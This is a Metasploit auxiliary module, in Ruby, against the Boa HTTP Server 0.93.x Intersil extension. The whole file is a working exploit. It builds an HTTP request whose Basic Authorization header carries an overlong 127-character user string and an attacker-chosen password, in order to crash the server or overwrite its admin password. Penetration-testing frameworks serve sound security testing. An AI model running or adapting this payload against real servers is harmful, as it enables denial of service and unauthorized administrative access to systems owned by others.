##
# $Id: boa_auth_dos.rb 15014 2012-06-06 15:13:11Z rapid7 $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Tcp
	include Msf::Auxiliary::Dos

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Boa HTTPd Basic Authentication Overflow',
			'Description'    => %q{
					The Intersil extention in the Boa HTTP Server 0.93.x
				allows denial of service or possibly authentication bypass
				via a Basic Authentication header with a user string greater than 127 characters. You must set
				the request URI to the directory that requires basic authentication.
			},
			'Author'         =>
				[
					'Luca "ikki" Carettoni <luca.carettoni[at]securenetwork.it>', #original discoverer
					'Claudio "paper" Merloni <claudio.merloni[at]securenetwork.it>', #original discoverer
					'Max Dietz <maxwell.r.dietz[at]gmail.com>' #metasploit module
				],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'URL', 'http://packetstormsecurity.org/files/59347/boa-bypass.txt.html'],
				],
			'DisclosureDate' => 'Sep 10 2007'))

		register_options(
			[
				Opt::RPORT(80),
				OptString.new('URI', [ true,  "The request URI", '/']),
				OptString.new('Password', [true, 'The password to set (if possible)', 'pass'])
			], self.class)
	end

	def run
		begin
			connect
			print_status("Sending packet to #{rhost}:#{rport}")
			auth = "X" * 127
			auth << ":"
			auth << datastore['Password']

			sploit = "GET "
			sploit << datastore['URI']
			sploit << " HTTP/1.1\r\nAuthorization: Basic\r\n"
			sploit << Base64.encode64(auth)
			sploit << "\r\n\r\n"

			sock.put(sploit)
			disconnect

			print_status("Server not crashed.  Either the password for 'admin' has been changed or this server is not vulnerable")

		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
			print_status("Unable to connect to #{rhost}:#{rport}.")
		rescue ::ERRNO::ECONNRESET
			print_status("DoS packet successful. #{rhost} not responding.")
		rescue ::Timeout::Error, ::Errno::EPIPE
		end
	end
end
